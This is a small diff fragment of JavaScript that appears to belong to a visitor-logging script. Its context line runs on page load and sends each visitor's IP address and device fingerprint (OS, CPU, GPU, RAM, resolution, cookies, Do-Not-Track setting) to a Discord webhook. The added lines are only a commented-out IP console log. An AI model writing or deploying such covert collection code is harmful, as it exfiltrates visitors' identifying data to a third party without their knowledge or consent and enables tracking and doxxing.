@@ -284,3 +284,9 @@ document.addEventListener("DOMContentLoaded", (ev) => {
     setTimeout(() => {discord(discordUrl, "Log", info.version, ip, info.os, info.arch, info.darkmode, info.cpu, info.orientation, info.ram, info.res, info.cookie, info.supportsCookie, info.html5, info.gpu, info.version, info.dnt)},250)
 
 })
+
+/*
+uniqueness.getIP().then(ip => {
+  console.log(ip);
+});
+*/
